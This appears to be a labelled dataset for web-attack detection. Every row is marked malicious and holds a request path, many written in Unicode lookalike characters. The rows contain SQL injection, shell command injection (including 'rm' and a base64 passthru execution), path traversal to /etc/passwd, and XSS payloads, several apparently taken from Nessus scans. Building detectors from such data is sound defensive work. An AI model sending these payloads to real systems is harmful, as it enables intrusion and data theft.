sentences 	 labels
/ j𝘢𝖛ascript / fusion . exe  	 1
/ ѕ𝖙ring / strings / parameters = 1 '  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  ' jiyx '  =  ' jiyx  	 1
/ ƽ𝕥ring / modo = registro & login =  + vonnie & password = llanisca & nombre = onella & apellidos = wiedeman + naln & email = sirichanya @ vinavilano . pe & dni = 97036086y & direccion = calle + yela + utrilla + 150 +  & ciudad = villanueva + del + trabuco & cp = 37450 & provincia = mlaga & ntc = 3862460916827849 & b1 = registrar  	 1
/ 𐑈𝚝ring / strings / parameters = 1 "  "  ; select case when 7717 = 7717 then 1 else null end --  	 1
/ 𝚎𝐱amples / jsp / error / cwmail . exe  	 1
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  { file }  	 1
/ 𝒕o𝗽 . php ? stuff =  '  ; rm \ x09q48683432 \ x09 #  	 1
/ 𐑈𝐭ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  	 1
/  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  { file }  	 1
/  { file }  	 1
/ 𝚎n-𝚞s / account / cal_make . pl ? p0 =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𐑈𝙩ring / strings / parameters = 1 and 2716 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  --  	 1
/ m𝗮n𝖺ger / nucleus / libs / pluginadmin . php ? globals [ dir_libs ]  =  / etc / passwd \ x00  	 1
/ 𝐢n𝘤lude / include_top . php ? g_include = xxpathxx  	 1
/ 𝙥𝒉pmyadmin / www / delivery / ac . php ? bannerid = -1331904221 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus_ucypkczy ]  )  )  ; die ;  /  *  	 1
/ 𝔢𝘅amples / jsp / checkbox / kb . cgi ? view =  '  & lang = en  	 1
/ 𑣁сripts / msmmask . exe ? mask =  / nessus893655960 . asp  	 1
/ jɑ𝓿ascript /  . passwd . ini  	 1
/ 𝘀𝔱ring / strings / parameters = '  ; echo $ ifsxqahul $  (  ( 9 + 99 )  )  $  ( echo $ ifsxqahul ) xqahul '  	 1
/ jɑ𝘃ascript / portals . exe  	 1
/ 𝚜𝗍ring / strings / parameters = < head >  < meta http-equiv =  "  " content-type "  "  content =  "  " text / html ;  charset = utf-7 "  "  >   <  / head >  + adw-script + ad4-alert (  ' crosssitescripting '  )  ;  + adw- / script + ad4-  	 1
/ m𝖆𝑖n . php ? logout =  '  \ x0auname  > q64819443  #  	 1
/ 𝖈𝕘i-bin / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category /  	 1
/ ѕ𝘁ring / strings / parameters = ;  str =  $  ( echo eekjde )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 1
/ j𝕒𝑣ascript / chrome . exe  	 1
/ 𝔮𝗎agynka . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ j𝗮𝘃ascript / esales . exe  	 1
/ 𝘴𝕥ring / strings / parameters = 1 "  "  )  as tecq where 4817 = 4817 and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ 𝑠𝔱ring / strings / parameters = < marquee loop = 1 width = 0 onfinish = confirm ( 1 )  > 0 <  / marquee >  	 1
/ 𐑈𝕥ring / str =  $  ( echo tikhvb )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  	 1
/ 𝘴𝖼ripts / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl  	 1
